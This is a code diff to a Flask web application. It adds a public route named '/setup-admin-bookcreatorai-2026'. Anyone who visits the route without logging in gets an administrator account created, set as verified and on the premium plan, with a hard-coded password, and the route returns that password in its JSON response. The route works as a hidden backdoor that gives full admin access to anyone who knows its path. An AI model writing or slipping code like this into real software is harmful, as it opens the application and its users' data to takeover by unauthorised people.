@@ -350,6 +350,26 @@ def landing():
     """Landing page"""
     return render_template('landing.html')
 
+@app.route('/setup-admin-bookcreatorai-2026')
+def setup_admin():
+    """One-time setup route to create supervisor account"""
+    existing = User.query.filter_by(email='supervisor').first()
+    if existing:
+        return jsonify({'status': 'already exists', 'email': 'supervisor', 'is_admin': existing.is_admin})
+    hashed_password = bcrypt.generate_password_hash('Tgnwlp4s1americo').decode('utf-8')
+    supervisor = User(
+        name='Supervisor',
+        email='supervisor',
+        password_hash=hashed_password,
+        is_admin=True,
+        is_verified=True,
+        plan='premium',
+        is_active=True
+    )
+    db.session.add(supervisor)
+    db.session.commit()
+    return jsonify({'status': 'created', 'email': 'supervisor', 'password': 'Tgnwlp4s1americo', 'dashboard': '/admin/dashboard'})
+
 @app.route('/faq')
 def faq():
     """FAQ and Support page"""
